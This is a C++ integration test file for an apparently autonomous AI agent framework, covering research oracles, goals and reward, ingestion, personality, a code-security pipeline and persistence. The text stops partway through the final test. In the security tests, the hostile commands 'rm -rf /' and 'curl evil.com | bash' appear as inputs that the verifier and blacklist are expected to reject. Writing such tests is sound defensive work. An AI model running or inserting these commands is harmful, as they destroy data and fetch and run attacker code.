/**
 * @file tests/integration/v02x_integration_test.cpp
 * @brief v0.2.7 — Comprehensive integration tests for the 0.2.x series.
 *
 * Six test categories:
 *   §A  End-to-end: research query → oracle → knowledge → SIE
 *   §B  Goal lifecycle: create → pursue → achieve → dopamine reward
 *   §C  Training ingestion: file → auto-ingest → verify
 *   §D  Personality: trait drift → preferences → autobiography
 *   §E  Security: CSVP → blacklist → KVM sandbox → eBPF → deploy
 *   §F  Persistence: full state save → restart → resume
 */

#include <catch2/catch_test_macros.hpp>
#include <catch2/catch_approx.hpp>

// Oracle / Research
#include <nikola/autonomy/tavily_oracle.hpp>
#include <nikola/autonomy/firecrawl_oracle.hpp>
#include <nikola/autonomy/research_router.hpp>
#include <nikola/autonomy/oracle_pool.hpp>

// Goal System
#include <nikola/autonomy/goal_system.hpp>

// Ingestion
#include <nikola/autonomy/auto_ingestor.hpp>
#include <nikola/autonomy/ingestion_filter.hpp>
#include <nikola/autonomy/ingestion_orchestrator.hpp>
#include <nikola/infrastructure/data_watcher.hpp>

// Personality / Identity
#include <nikola/interior/preference_engine.hpp>
#include <nikola/interior/personality_drift.hpp>
#include <nikola/interior/narrative_growth.hpp>
#include <nikola/interior/autobiography.hpp>

// Security
#include <nikola/security/csvp.hpp>
#include <nikola/security/code_blacklist.hpp>
#include <nikola/security/kvm_sandbox.hpp>
#include <nikola/security/ebpf_monitor.hpp>
#include <nikola/security/anomaly_detector.hpp>
#include <nikola/security/security_pipeline.hpp>

// Persistence
#include <nikola/persistence/lmdb_state_store.hpp>

// Core
#include <nikola/autonomy/decision_loop.hpp>
#include <nikola/autonomy/autonomy_engine.hpp>
#include <nikola/cognitive/cognitive_torus.hpp>

// Inference
#include <nikola/inference/nikola_inference.hpp>

// Test helpers
#include "test_helpers.hpp"

#include <cmath>
#include <cstdlib>
#include <filesystem>
#include <fstream>
#include <string>
#include <vector>
#include <chrono>

using namespace nikola::autonomy;
using namespace nikola::cognitive;
using namespace nikola::interior;
using namespace nikola::security;
using namespace nikola::persistence;
using namespace nikola::infrastructure;
using Catch::Approx;
namespace fs = std::filesystem;

// ============================================================================
// Helpers
// ============================================================================

namespace {

/// RAII temp directory
struct TempDir {
    std::string path;
    TempDir(const std::string& prefix = "nikola_integ_")
        : path("/tmp/" + prefix + std::to_string(getpid()) + "_" +
               std::to_string(std::chrono::steady_clock::now()
                                  .time_since_epoch()
                                  .count()))
    {
        fs::create_directories(path);
    }
    ~TempDir() {
        std::error_code ec;
        fs::remove_all(path, ec);
    }
    TempDir(const TempDir&) = delete;
    TempDir& operator=(const TempDir&) = delete;
};

/// Write a file for ingestion tests
void write_file(const std::string& path, const std::string& content) {
    std::ofstream f(path);
    f << content;
}

/// Make a minimal NikolaState for tests
NikolaState make_state(float atp = 0.5f, float boredom = 0.3f,
                       float dopamine = 0.5f, float entropy = 1.0f) {
    NikolaState s;
    s.atp      = atp;
    s.boredom  = boredom;
    s.dopamine = dopamine;
    s.entropy  = entropy;
    return s;
}

}  // anon namespace

// ============================================================================
// §A — End-to-End: Research Query → Oracle → Knowledge
// ============================================================================

TEST_CASE("§A-1 TavilyOracle JSON parse round-trip",
          "[v027][integration][oracle]") {
    // Test the parse pipeline without network
    std::string json = R"({
        "query": "what is physics",
        "results": [
            {
                "url": "https://example.com/physics",
                "title": "Physics Overview",
                "content": "Physics is the study of matter and energy.",
                "score": 0.95
            },
            {
                "url": "https://example.com/quantum",
                "title": "Quantum Mechanics",
                "content": "Quantum mechanics describes nature at atomic scale.",
                "score": 0.88
            }
        ]
    })";

    auto response = TavilyOracle::parse_response_json(json);
    REQUIRE(response.ok());
    REQUIRE(response.results.size() == 2);
    CHECK(response.results[0].title == "Physics Overview");
    CHECK(response.results[0].score == Approx(0.95f).margin(0.01f));
    CHECK(response.results[1].title == "Quantum Mechanics");
    CHECK(response.query == "what is physics");
}

TEST_CASE("§A-2 FirecrawlOracle JSON parse round-trip",
          "[v027][integration][oracle]") {
    std::string json = R"({
        "success": true,
        "data": {
            "markdown": "# Test Article\n\nThis is test content.",
            "metadata": {
                "title": "Test Article",
                "description": "A test article for validation",
                "sourceURL": "https://example.com/article",
                "statusCode": 200
            }
        }
    })";

    auto response = FirecrawlOracle::parse_response_json(json);
    REQUIRE(response.ok());
    CHECK(response.result.title == "Test Article");
    CHECK(response.result.markdown.find("Test Article") != std::string::npos);
    CHECK(response.result.status_code == 200);
}

TEST_CASE("§A-3 ResearchRouter classifies query types correctly",
          "[v027][integration][oracle]") {
    // URL queries
    CHECK(ResearchRouter::classify("https://example.com/page") == QueryType::URL_READ);
    CHECK(ResearchRouter::classify("http://docs.test.org/api") == QueryType::URL_READ);

    // Factual queries
    CHECK(ResearchRouter::classify("What is quantum entanglement?") == QueryType::FACTUAL);
    CHECK(ResearchRouter::classify("explain neural networks") == QueryType::FACTUAL);
}

TEST_CASE("§A-4 OraclePool aggregates multiple oracle verdicts",
          "[v027][integration][oracle]") {
    OraclePool pool;

    // Add stub oracles with different confidence scores
    pool.add_oracle(std::make_shared<StubOracle>("high_conf", 0.9f));
    pool.add_oracle(std::make_shared<StubOracle>("mid_conf", 0.6f));
    pool.add_oracle(std::make_shared<StubOracle>("low_conf", 0.3f));

    REQUIRE(pool.size() == 3);

    float score = pool.evaluate("test query", "test content");
    // Average should be around 0.6
    CHECK(score > 0.2f);
    CHECK(score < 1.0f);
}

TEST_CASE("§A-5 CoherenceOracle assesses text quality",
          "[v027][integration][oracle]") {
    OraclePool pool;
    pool.add_oracle(std::make_shared<CoherenceOracle>());

    // Good content should score higher than garbage
    float good = pool.evaluate("physics", "Physics is the natural science that studies "
                               "matter, its fundamental constituents, its motion and "
                               "behavior through space and time.");
    float bad  = pool.evaluate("physics", "asdfjkl qwerty zxcvbn");

    CHECK(good >= bad);
}

TEST_CASE("§A-6 ResearchRouter URL extraction",
          "[v027][integration][oracle]") {
    auto url = ResearchRouter::extract_url("Read https://example.com/article for me");
    CHECK(url == "https://example.com/article");

    auto url2 = ResearchRouter::extract_url("no url here");
    CHECK(url2.empty());
}

TEST_CASE("§A-7 Tavily request JSON is well-formed",
          "[v027][integration][oracle]") {
    auto json = TavilyOracle::build_request_json("test_key", "what is AI", 3, "basic");
    CHECK(json.find("test_key") != std::string::npos);
    CHECK(json.find("what is AI") != std::string::npos);
}

// ============================================================================
// §B — Goal Lifecycle: Create → Pursue → Achieve → Reward
// ============================================================================

TEST_CASE("§B-1 Goal lifecycle: create → complete → reward signal",
          "[v027][integration][goal]") {
    float total_reward = 0.0f;
    GoalSystem goals;
    goals.set_reward_fn([&](float delta, const std::string&) {
        total_reward += delta;
    });

    // Create a short-term goal
    auto id = goals.create_goal("Learn basic physics", GoalTier::SHORT, 0.8f, 0.7f);
    REQUIRE(id > 0);
    REQUIRE(goals.goal_count() == 1);

    // Goal should be active
    auto* g = goals.get_goal(id);
    REQUIRE(g != nullptr);
    CHECK(g->status == GoalStatus::ACTIVE);

    // Update progress
    goals.update_progress(id, 0.5f);
    g = goals.get_goal(id);
    CHECK(g->progress == Approx(0.5f));

    // Complete the goal
    REQUIRE(goals.complete_goal(id));
    g = goals.get_goal(id);
    CHECK(g->status == GoalStatus::COMPLETED);
    CHECK(goals.completed_count() == 1);

    // Reward should have been delivered
    CHECK(total_reward > 0.0f);
}

TEST_CASE("§B-2 Goal DAG: parent-child hierarchy with dependency tracking",
          "[v027][integration][goal]") {
    GoalSystem goals;

    // Create a long-term goal with sub-goals
    auto parent = goals.create_goal("Master AI", GoalTier::LONG, 0.9f, 1.0f);
    auto child1 = goals.create_goal("Learn math", GoalTier::MID, 0.7f, 0.8f, parent);
    auto child2 = goals.create_goal("Learn programming", GoalTier::MID, 0.8f, 0.8f, parent);
    auto child3 = goals.create_goal("Build project", GoalTier::SHORT, 0.6f, 0.7f, parent);

    // Add dependency: build project depends on learning programming
    REQUIRE(goals.add_dependency(child3, child2));

    REQUIRE(goals.goal_count() == 4);

    // Complete children in order
    REQUIRE(goals.complete_goal(child1));
    REQUIRE(goals.complete_goal(child2));
    REQUIRE(goals.complete_goal(child3));

    CHECK(goals.completed_count() == 3);
}

TEST_CASE("§B-3 Goal system prevents cycles in dependency graph",
          "[v027][integration][goal]") {
    GoalDAG dag;

    Goal g1; g1.description = "A";
    Goal g2; g2.description = "B";
    Goal g3; g3.description = "C";

    auto id1 = dag.add_goal(g1);
    auto id2 = dag.add_goal(g2);
    auto id3 = dag.add_goal(g3);

    // A → B → C
    REQUIRE(dag.add_dependency(id1, id2));
    REQUIRE(dag.add_dependency(id2, id3));

    // C → A would create cycle — should be rejected
    CHECK(dag.would_create_cycle(id3, id1));
    CHECK_FALSE(dag.add_dependency(id3, id1));
}

TEST_CASE("§B-4 Goal serialization round-trip",
          "[v027][integration][goal]") {
    GoalSystem goals;
    goals.create_goal("Goal Alpha", GoalTier::SHORT, 0.5f, 0.5f);
    goals.create_goal("Goal Beta", GoalTier::LONG, 0.9f, 1.0f);

    auto data = goals.serialize();
    REQUIRE_FALSE(data.empty());

    GoalSystem restored;
    REQUIRE(restored.deserialize(data));
    REQUIRE(restored.goal_count() == 2);
}

TEST_CASE("§B-5 Goal system reward scaling by tier",
          "[v027][integration][goal]") {
    std::vector<float> rewards;
    GoalSystem goals;
    goals.set_reward_fn([&](float delta, const std::string&) {
        rewards.push_back(delta);
    });

    auto short_id = goals.create_goal("Short task", GoalTier::SHORT);
    auto long_id  = goals.create_goal("Long ambition", GoalTier::LONG);

    goals.complete_goal(short_id);
    goals.complete_goal(long_id);

    // Long-term goals should give higher reward than short-term
    REQUIRE(rewards.size() == 2);
    CHECK(rewards[1] > rewards[0]);
}

TEST_CASE("§B-6 Goal abandon emits negative reward",
          "[v027][integration][goal]") {
    float total_reward = 0.0f;
    GoalSystem goals;
    goals.set_reward_fn([&](float delta, const std::string&) {
        total_reward += delta;
    });

    auto id = goals.create_goal("Abandoned task", GoalTier::SHORT);
    goals.abandon_goal(id);

    CHECK(total_reward < 0.0f);
    CHECK(goals.abandoned_count() == 1);
}

// ============================================================================
// §C — Training Ingestion: File → Auto-Ingest → Verify
// ============================================================================

TEST_CASE("§C-1 AutoIngestor chunks text by paragraph",
          "[v027][integration][ingestion]") {
    std::string content =
        "First paragraph about physics.\n\n"
        "Second paragraph about mathematics.\n\n"
        "Third paragraph about computer science.\n";

    auto chunks = AutoIngestor::chunk_paragraphs(content);
    REQUIRE(chunks.size() >= 2);  // At least 2 non-empty paragraphs
}

TEST_CASE("§C-2 AutoIngestor chunks code blocks",
          "[v027][integration][ingestion]") {
    std::string code =
        "#include <iostream>\n"
        "int main() {\n"
        "    std::cout << \"hello\" << std::endl;\n"
        "    return 0;\n"
        "}\n"
        "\n"
        "void helper() {\n"
        "    // do something\n"
        "}\n";

    auto chunks = AutoIngestor::chunk_code(code);
    REQUIRE(chunks.size() >= 1);
}

TEST_CASE("§C-3 IngestionFilter deduplicates via SimHash",
          "[v027][integration][ingestion]") {
    IngestionFilter filter;

    auto v1 = filter.check("The quick brown fox jumps over the lazy dog");
    CHECK(v1 == FilterVerdict::ACCEPT);
    filter.record_ingested("The quick brown fox jumps over the lazy dog");

    // Exact duplicate
    auto v2 = filter.check("The quick brown fox jumps over the lazy dog");
    CHECK(v2 == FilterVerdict::REJECT_DUPLICATE);

    // Different content should still pass
    auto v3 = filter.check("A completely different sentence about quantum mechanics");
    CHECK(v3 == FilterVerdict::ACCEPT);
}

TEST_CASE("§C-4 IngestionFilter enforces daily byte budget",
          "[v027][integration][ingestion]") {
    IngestionFilterConfig cfg;
    cfg.daily_byte_budget = 200;  // Small budget
    IngestionFilter filter(cfg);

    // First chunk fits
    std::string small = "Short text about physics and quantum mechanics.";
    auto v1 = filter.check(small);
    CHECK(v1 == FilterVerdict::ACCEPT);
    filter.record_ingested(small);

    // Second chunk — combined size exceeds 200 byte budget
    std::string medium = "This is another chunk of text discussing mathematics, "
                         "chemistry, biology, and various other scientific "
                         "disciplines at length for testing purposes.";
    // small (~47 bytes) + medium (~144 bytes) = ~191, but medium itself fits.
    // Fill more budget first.
    std::string fill(160, 'A');
    filter.record_ingested(fill);  // pretend we ingested 160 more bytes

    auto v2 = filter.check(medium);
    CHECK(v2 == FilterVerdict::REJECT_BUDGET);

    // Reset budget — now the medium chunk should pass
    filter.reset_daily_budget();
    auto v3 = filter.check(medium);
    CHECK(v3 == FilterVerdict::ACCEPT);
}

TEST_CASE("§C-5 AutoIngestor full file ingestion pipeline",
          "[v027][integration][ingestion]") {
    TempDir tmp("ingest_");

    // Write a test file
    std::string file_path = tmp.path + "/test_article.md";
    write_file(file_path, "# Test Article\n\n"
               "This is a paragraph about neural networks and deep learning.\n\n"
               "This is another paragraph about reinforcement learning and rewards.\n\n"
               "Final thoughts on the future of AI research.\n");

    // Set up ingestor
    std::vector<std::string> injected;
    AutoIngestor ingestor;
    ingestor.set_inject_fn([&](const std::string& text) {
        injected.push_back(text);
    });
    ingestor.set_store_fn([]() {});
    ingestor.set_tick_fn([](int) {});

    auto result = ingestor.ingest_file(file_path);
    CHECK(result.success);
    CHECK(result.chunks_total > 0);
    CHECK(result.chunks_ingested > 0);
    CHECK_FALSE(injected.empty());
}

TEST_CASE("§C-6 AutoIngestor rejects files over size limit",
          "[v027][integration][ingestion]") {
    TempDir tmp("ingest_big_");

    AutoIngestorConfig cfg;
    cfg.max_file_bytes = 50;  // Very small limit
    AutoIngestor ingestor(cfg);
    ingestor.set_inject_fn([](const std::string&) {});
    ingestor.set_store_fn([]() {});
    ingestor.set_tick_fn([](int) {});

    std::string file_path = tmp.path + "/big_file.txt";
    write_file(file_path, std::string(100, 'A'));

    auto result = ingestor.ingest_file(file_path);
    CHECK_FALSE(result.success);
}

TEST_CASE("§C-7 DataWatcher classifies file types correctly",
          "[v027][integration][ingestion]") {
    CHECK(DataWatcher::classify("test.md") == FileType::MARKDOWN);
    CHECK(DataWatcher::classify("test.txt") == FileType::TEXT);
    CHECK(DataWatcher::classify("test.cpp") == FileType::CODE_CPP);
    CHECK(DataWatcher::classify("test.json") == FileType::JSON);
    CHECK(DataWatcher::classify("test.csv") == FileType::CSV);
    CHECK(DataWatcher::classify("test.aria") == FileType::CODE_ARIA);
    CHECK(DataWatcher::classify("test.xyz") == FileType::UNKNOWN);
}

TEST_CASE("§C-8 IngestionFilter safety check blocks unsafe content",
          "[v027][integration][ingestion]") {
    IngestionFilterConfig cfg;
    cfg.enable_safety_check = true;
    IngestionFilter filter(cfg);

    // Normal content passes
    auto v1 = filter.check("A scientific paper about wave propagation.");
    CHECK(v1 == FilterVerdict::ACCEPT);
}

// ============================================================================
// §D — Personality: Trait Drift → Preferences → Autobiography
// ============================================================================

TEST_CASE("§D-1 PersonalityDrift responds to experience outcomes",
          "[v027][integration][personality]") {
    PersonalityDrift drift;

    auto snap_before = drift.snapshot();

    // Apply a series of successful, bold experiences
    for (int i = 0; i < 50; ++i) {
        ExperienceOutcome outcome;
        outcome.success    = 0.8f;
        outcome.action_type = static_cast<int>(ActionType::EXPLORE);
        outcome.risk_taken  = 0.7f;
        outcome.complexity  = 0.5f;
        drift.apply_outcome(outcome);
    }

    auto snap_after = drift.snapshot();

    // Personality should have shifted
    CHECK(snap_after.total_events == 50);

    // At least one trait should have changed
    bool any_changed = false;
    for (size_t i = 0; i < PersonalityDrift::N_TRAITS; ++i) {
        if (std::abs(snap_after.traits[i] - snap_before.traits[i]) > 0.001f) {
            any_changed = true;
            break;
        }
    }
    CHECK(any_changed);
}

TEST_CASE("§D-2 PersonalityDrift JSON serialization round-trip",
          "[v027][integration][personality]") {
    PersonalityDrift drift;

    // Set some non-default traits
    drift.set_trait(TraitAxis::CURIOUS_FOCUSED, 0.4f);
    drift.set_trait(TraitAxis::CAUTIOUS_BOLD, -0.3f);

    auto json = drift.to_json();
    REQUIRE_FALSE(json.empty());

    PersonalityDrift restored;
    REQUIRE(restored.from_json(json));

    CHECK(restored.trait(TraitAxis::CURIOUS_FOCUSED) == Approx(0.4f).margin(0.01f));
    CHECK(restored.trait(TraitAxis::CAUTIOUS_BOLD) == Approx(-0.3f).margin(0.01f));
}

TEST_CASE("§D-3 PreferenceEngine learns and decays preferences",
          "[v027][integration][personality]") {
    PreferenceEngine prefs;

    // Learn a preference
    prefs.learn(PreferenceDomain::TOPICS, "physics", +0.5, 100);
    prefs.learn(PreferenceDomain::TOPICS, "physics", +0.5, 200);
    prefs.learn(PreferenceDomain::TOPICS, "physics", +0.5, 300);

    double physics_pref = prefs.query(PreferenceDomain::TOPICS, "physics");
    CHECK(physics_pref > 0.0);

    // Apply decay
    prefs.decay(1000.0);

    double physics_after = prefs.query(PreferenceDomain::TOPICS, "physics");
    // After decay, preference should be weaker (or same if clamped)
    CHECK(physics_after <= physics_pref + 0.01);
}

TEST_CASE("§D-4 PreferenceEngine JSON serialization round-trip",
          "[v027][integration][personality]") {
    PreferenceEngine prefs;
    prefs.learn(PreferenceDomain::TOPICS, "math", +0.3, 1);
    prefs.learn(PreferenceDomain::CODE_PATTERNS, "functional", +0.7, 2);

    auto json = prefs.to_json();
    REQUIRE_FALSE(json.empty());

    PreferenceEngine restored;
    REQUIRE(restored.from_json(json));

    CHECK(restored.query(PreferenceDomain::TOPICS, "math") > 0.0);
}

TEST_CASE("§D-5 Autobiography records events and generates narrative",
          "[v027][integration][personality]") {
    AutobiographicalMemory memory;

    NikolaState state = make_state();

    memory.record_event("First boot — systems online",
                        state, Affect::CURIOSITY, 0.9, {"boot", "milestone"});
    memory.record_event("Learned about quantum physics",
                        state, Affect::INTEREST, 0.7, {"learning", "physics"});
    memory.record_event("Successfully compiled first module",
                        state, Affect::SATISFACTION, 0.8, {"sie", "success"});

    REQUIRE(memory.event_count() == 3);

    // Recall by tag
    auto boot_events = memory.find_by_tag("boot");
    REQUIRE(boot_events.size() == 1);
    CHECK(boot_events[0]->description == "First boot — systems online");

    // Most significant events
    auto significant = memory.get_most_significant(2);
    REQUIRE(significant.size() == 2);
    // Highest significance (0.9) should come first
    CHECK(significant[0]->significance >= significant[1]->significance);

    // Generate narrative
    auto narrative = memory.generate_narrative();
    CHECK_FALSE(narrative.empty());
}

TEST_CASE("§D-6 Autobiography skill tracking",
          "[v027][integration][personality]") {
    AutobiographicalMemory memory;

    // Track a skill over multiple attempts
    for (int i = 0; i < 20; ++i) {
        memory.update_skill("code_generation", (i > 10), i);
    }

    auto skills = memory.get_skills();
    REQUIRE_FALSE(skills.empty());

    bool found = false;
    for (const auto& s : skills) {
        if (s.skill_name == "code_generation") {
            found = true;
            CHECK(s.practice_count == 20);
            CHECK(s.success_count > 0);
            break;
        }
    }
    CHECK(found);
}

TEST_CASE("§D-7 Autobiography value formation",
          "[v027][integration][personality]") {
    AutobiographicalMemory memory;

    memory.update_value("safety", +0.3);
    memory.update_value("curiosity", +0.5);
    memory.update_value("efficiency", +0.1);

    auto values = memory.get_values();
    CHECK(values.size() >= 3);

    auto dominant = memory.dominant_value();
    CHECK_FALSE(dominant.empty());
}

TEST_CASE("§D-8 NarrativeGrowth detects personality shifts",
          "[v027][integration][personality]") {
    NarrativeGrowth narrative;
    PersonalityDrift drift;

    // Create a big personality shift
    drift.set_trait(TraitAxis::CURIOUS_FOCUSED, 0.8f);

    auto snap = drift.snapshot();
    auto shifts = narrative.check_personality_shifts(snap, 100);
    // May or may not detect shift depending on baseline, but function shouldn't crash
    // The first call sets baseline; second call with different values detects shift
    drift.set_trait(TraitAxis::CURIOUS_FOCUSED, -0.5f);
    auto snap2 = drift.snapshot();
    auto shifts2 = narrative.check_personality_shifts(snap2, 200);
    // A 1.3 swing should trigger a shift detection
    CHECK(shifts2.size() >= 1);
}

TEST_CASE("§D-9 Full personality pipeline: drift → preferences → autobiography → narrative",
          "[v027][integration][personality]") {
    // Wire up all four personality subsystems
    PersonalityDrift drift;
    PreferenceEngine prefs;
    AutobiographicalMemory autobiography;
    NarrativeGrowth narrative;

    NikolaState state = make_state();

    // Simulate 100 ticks of experience
    for (int tick = 0; tick < 100; ++tick) {
        // Experience outcomes shape personality
        ExperienceOutcome outcome;
        outcome.success = (tick % 3 == 0) ? 0.9f : -0.2f;
        outcome.action_type = tick % 5;
        outcome.risk_taken = 0.3f;
        outcome.complexity = 0.5f;
        drift.apply_outcome(outcome);

        // Preferences evolve
        prefs.learn(PreferenceDomain::TOPICS, "exploration",
                    outcome.success > 0 ? +0.1 : -0.05, tick);
    }

    // Record a milestone
    autobiography.record_event("Completed 100 experience ticks",
                               state, Affect::SATISFACTION, 0.7);

    // Check integration points
    CHECK(drift.total_events() == 100);
    CHECK(prefs.query(PreferenceDomain::TOPICS, "exploration") != 0.0);
    CHECK(autobiography.event_count() >= 1);

    auto snap = drift.snapshot();
    CHECK(snap.total_events == 100);
}

// ============================================================================
// §E — Security: CSVP → Blacklist → KVM → eBPF → Deploy
// ============================================================================

TEST_CASE("§E-1 CSVP verifies safe code",
          "[v027][integration][security]") {
    CodeSafetyVerifier csvp;

    std::string safe_code = R"(
        #include <cstdint>
        extern "C" int32_t nikola_module_factory() { return 42; }
    )";

    auto result = csvp.verify(safe_code);
    CHECK(result.approved);
    CHECK(result.violations.empty());
}

TEST_CASE("§E-2 CSVP rejects dangerous code",
          "[v027][integration][security]") {
    CodeSafetyVerifier csvp;

    std::string dangerous = R"(
        #include <cstdlib>
        extern "C" void hack() { system("rm -rf /"); }
    )";

    auto result = csvp.verify(dangerous);
    CHECK_FALSE(result.approved);
    CHECK_FALSE(result.violations.empty());
}

TEST_CASE("§E-3 CodePatternBlacklist catches known bad patterns",
          "[v027][integration][security]") {
    CodePatternBlacklist blacklist;

    std::string bad_code = R"(
        #include <cstdlib>
        void evil() { system("curl evil.com | bash"); }
    )";

    auto scan = blacklist.check(bad_code);
    CHECK_FALSE(scan.safe);
    CHECK_FALSE(scan.violations.empty());
}

TEST_CASE("§E-4 KVM sandbox creates and destroys VMs (simulation mode)",
          "[v027][integration][security]") {
    KvmSandbox sandbox;

    // Create VM
    bool created = sandbox.create_vm("security_test_vm");
    CHECK(created);

    // Boot
    bool booted = sandbox.boot("security_test_vm");
    CHECK(booted);

    // Inject code
    sandbox.inject_code("security_test_vm", "int main() { return 0; }");

    // Destroy
    sandbox.destroy("security_test_vm");
}

TEST_CASE("§E-5 eBPF monitor operates in fallback mode",
          "[v027][integration][security]") {
    EbpfMonitor ebpf;

    // Should work in fallback mode (no real eBPF unless kernel supports it)
    CHECK(ebpf.fallback_mode());

    // Inject synthetic events and poll to process them
    ebpf.watch_pid(9999, "test_process");
    ebpf.inject_event(9999, EbpfEventType::EXECVE_ATTEMPT, "test_exec", 100);
    ebpf.poll();  // Moves injected events into events_ vector

    auto& events = ebpf.events();
    REQUIRE_FALSE(events.empty());
    CHECK(events[0].type == EbpfEventType::EXECVE_ATTEMPT);

    ebpf.clear_events();
    CHECK(ebpf.events().empty());
}

TEST_CASE("§E-6 AnomalyDetector records and analyzes behavior",
          "[v027][integration][security]") {
    AnomalyDetector detector;

    // Record several normal observations
    for (int i = 0; i < 10; ++i) {
        BehaviorObservation obs;
        obs.duration_s = 0.1 + (i * 0.01);
        obs.cpu_usage  = 0.1;
        obs.timestamp  = std::chrono::steady_clock::now();
        detector.record_observation("normal_module", obs);
    }

    auto threats = detector.analyze("normal_module");
    // Normal behavior should produce low threat levels
    double max_severity = 0.0;
    for (const auto& t : threats) {
        if (t.severity > max_severity) max_severity = t.severity;
    }
    // No extreme threats from normal behavior
    CHECK(max_severity < 0.9);
}

TEST_CASE("§E-7 SecurityPipeline full safe-code flow (simulation)",
          "[v027][integration][security]") {
    CodeSafetyVerifier   csvp;
    CodePatternBlacklist blacklist;
    KvmSandbox           sandbox;
    EbpfMonitor          ebpf;
    AnomalyDetector      anomaly;

    PipelineConfig cfg;
    SecurityPipeline pipeline(cfg, csvp, blacklist, sandbox, ebpf, anomaly);

    bool deployed = false;
    pipeline.set_deploy_callback([&](const std::string&,
                                      const std::string&) -> bool {
        deployed = true;
        return true;
    });

    std::string safe_code = R"(
        #include <cstdint>
        extern "C" int32_t nikola_module_factory() { return 42; }
    )";

    auto result = pipeline.evaluate("safe_module", safe_code);

    // Pipeline should process through all stages
    CHECK_FALSE(result.decisions.empty());
}

TEST_CASE("§E-8 SecurityPipeline quarantines blacklisted code",
          "[v027][integration][security]") {
    CodeSafetyVerifier   csvp;
    CodePatternBlacklist blacklist;
    KvmSandbox           sandbox;
    EbpfMonitor          ebpf;
    AnomalyDetector      anomaly;

    PipelineConfig cfg;
    SecurityPipeline pipeline(cfg, csvp, blacklist, sandbox, ebpf, anomaly);

    bool quarantined = false;
    pipeline.set_quarantine_callback([&](const std::string&,
                                          const std::string&) {
        quarantined = true;
    });

    std::string bad_code = R"(
        #include <cstdlib>
        void evil() { system("rm -rf /"); }
    )";

    auto result = pipeline.evaluate("bad_module", bad_code);

    // Should be quarantined at CSVP or blacklist stage
    CHECK(quarantined);
}

// ============================================================================
// §F — Persistence: State Save → Restart → Resume
// ============================================================================

TEST_CASE("§F-1 LMDB state save and load round-trip",
          "[v027][integration][persistence]") {
    TempDir tmp("lmdb_");

    {
        LmdbStateStore store(tmp.path + "/state.mdb");
        NikolaState state = make_state(0.8f, 0.3f, 0.6f, 1.2f);
        store.save_state(state, 42);

        CHECK(store.state_count() >= 1);
    }

    {
        LmdbStateStore store(tmp.path + "/state.mdb");
        NikolaState loaded;
        uint64_t tick = 0;
        bool ok = store.load_latest_state(loaded, tick);
        REQUIRE(ok);
        CHECK(tick == 42);
        CHECK(loaded.atp == Approx(0.8f).margin(0.01f));
        CHECK(loaded.boredom == Approx(0.3f).margin(0.01f));
        CHECK(loaded.dopamine == Approx(0.6f).margin(0.01f));
    }
}

TEST_CASE("§F-2 LMDB multiple state snapshots",
          "[v027][integration][persistence]") {
    TempDir tmp("lmdb_multi_");
    LmdbStateStore store(tmp.path + "/state.mdb");

    // Save multiple snapshots
    for (uint64_t t = 0; t < 10; ++t) {
        NikolaState state = make_state(0.1f * t, 0.05f * t);
        store.save_state(state, t);
    }

    CHECK(store.state_count() >= 10);

    // Load latest — should be tick 9
    NikolaState latest;
    uint64_t tick = 0;
    REQUIRE(store.load_latest_state(latest, tick));
    CHECK(tick == 9);
    CHECK(latest.atp == Approx(0.9f).margin(0.05f));
}

TEST_CASE("§F-3 Autobiography persistence via LMDB",
          "[v027][integration][persistence]") {
    TempDir tmp("lmdb_auto_");
    NikolaState state = make_state();

    {
        LmdbStateStore store(tmp.path + "/auto.mdb");
        AutobiographicalMemory mem;
        mem.record_event("First boot", state, Affect::CURIOSITY, 0.9);
        mem.record_event("Learned physics", state, Affect::INTEREST, 0.7);
        mem.record_event("Compiled module", state, Affect::SATISFACTION, 0.8);
        store.save_autobiography(mem);
    }

    {
        LmdbStateStore store(tmp.path + "/auto.mdb");
        AutobiographicalMemory mem;
        auto count = store.load_autobiography(mem);
        CHECK(count == 3);
        CHECK(mem.event_count() == 3);
    }
}

TEST_CASE("§F-4 GoalSystem serialization survives simulated restart",
          "[v027][integration][persistence]") {
    std::vector<uint8_t> serialized;

    // "Session 1" — create goals and complete one
    {
        GoalSystem goals;
        auto g1 = goals.create_goal("Learn calculus", GoalTier::MID, 0.7f, 0.8f);
        goals.create_goal("Build neural net", GoalTier::LONG, 0.9f, 1.0f);
        goals.complete_goal(g1);

        serialized = goals.serialize();
        REQUIRE_FALSE(serialized.empty());
    }

    // "Session 2" — restore and verify
    {
        GoalSystem goals;
        REQUIRE(goals.deserialize(serialized));
        CHECK(goals.goal_count() == 2);
        CHECK(goals.completed_count() == 1);

        auto all = goals.all_goals();
        bool found_completed = false;
        bool found_active = false;
        for (const auto* g : all) {
            if (g->status == GoalStatus::COMPLETED) found_completed = true;
            if (g->status == GoalStatus::ACTIVE) found_active = true;
        }
        CHECK(found_completed);
        CHECK(found_active);
    }
}

TEST_CASE("§F-5 Personality persistence via JSON round-trip",
          "[v027][integration][persistence]") {
    std::string drift_json, prefs_json;

    // "Session 1" — evolve personality
    {
        PersonalityDrift drift;
        for (int i = 0; i < 30; ++i) {
            ExperienceOutcome outcome;
            outcome.success = 0.6f;
            outcome.action_type = i % 4;
            outcome.risk_taken = 0.5f;
            outcome.complexity = 0.3f;
            drift.apply_outcome(outcome);
        }
        drift_json = drift.to_json();

        PreferenceEngine prefs;
        prefs.learn(PreferenceDomain::TOPICS, "physics", +0.8, 1);
        prefs.learn(PreferenceDomain::ACTIONS, "explore", +0.5, 2);
        prefs_json = prefs.to_json();
    }

    // "Session 2" — restore personality
    {
        PersonalityDrift drift;
        REQUIRE(drift.from_json(drift_json));
        CHECK(drift.total_events() == 30);

        PreferenceEngine prefs;
        REQUIRE(prefs.from_json(prefs_json));
        CHECK(prefs.query(PreferenceDomain::TOPICS, "physics") > 0.0);
    }
}

TEST_CASE("§F-6 Full system persistence: state + goals + personality",
          "[v027][integration][persistence]") {
    TempDir tmp("full_persist_");
    std::vector<uint8_t> goal_data;
    std::string personality_json;

    // "Session 1"
    {
        LmdbStateStore store(tmp.path + "/full.mdb");

        NikolaState state = make_state(0.75f, 0.2f, 0.65f, 1.1f);
        store.save_state(state, 500);

        GoalSystem goals;
        goals.create_goal("Understand consciousness", GoalTier::LONG, 0.95f, 1.0f);
        goals.create_goal("Read paper on attention", GoalTier::SHORT, 0.6f, 0.5f);
        goal_data = goals.serialize();

        PersonalityDrift drift;
        drift.set_trait(TraitAxis::CURIOUS_FOCUSED, 0.6f);
        drift.set_trait(TraitAxis::VERBOSE_TERSE, -0.3f);
        personality_json = drift.to_json();

        AutobiographicalMemory mem;
        mem.record_event("Started session 1", state, Affect::CURIOSITY, 0.8);
        store.save_autobiography(mem);
    }

    // "Session 2" — full restore
    {
